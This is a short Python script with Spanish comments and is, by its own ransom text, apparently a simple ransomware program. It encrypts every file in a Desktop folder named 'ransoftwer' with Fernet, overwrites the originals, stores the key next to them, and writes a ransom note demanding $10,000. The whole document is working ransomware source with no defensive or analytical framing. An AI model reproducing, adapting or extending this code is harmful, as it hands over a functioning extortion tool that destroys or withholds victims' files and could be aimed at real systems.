from cryptography.fernet import Fernet 
import os 
import getpass 

#funciones de encriptacion 
def generar_clave():
	key=Fernet.generate_key()
	with open('key.key','wb') as guardar_clave:
		guardar_clave.write(key)


def cargar_clave():
	return open('key.key','rb').read() #leer clave y devolverla 


def encryptar(archivos,key):
	f=Fernet(key)

	#pasar por todos los archivos que quiero 
	for archivo in archivos:
		 
		with open(archivo,'rb') as file: #abrir el archivo
			file_data=file.read()

		encrypted_data=f.encrypt(file_data) #encriptar dato
    
		with open(archivo,'wb') as file: #sobre escribir el dato con la encriptacion
			file.write(encrypted_data)


#funciones de carpeta 
if __name__=='__main__':
	#encontrar la carpeta que deceo encriptar 
	nombreUsuario=getpass.getuser() 
	direcion_carpeta='C:\\Users\\{}\\Desktop\\ransoftwer'.format(nombreUsuario)
	archivos=os.listdir(direcion_carpeta) #cargar todos los archivos que existen 

	full_path=[direcion_carpeta+'\\'+archivo for archivo in archivos] #la direcion de los archivos 

	generar_clave()
	key=cargar_clave() #cargar la clave 

	encryptar(full_path,key) #encriptar los datos 

	#crear el fichero del rescate 
	with open(direcion_carpeta+'\\'+'rescate.txt','w') as texto:
		texto.write('Fichero encriptado por soulss\n')
		texto.write('Depositame 10000$ dolares para desencriptar\n')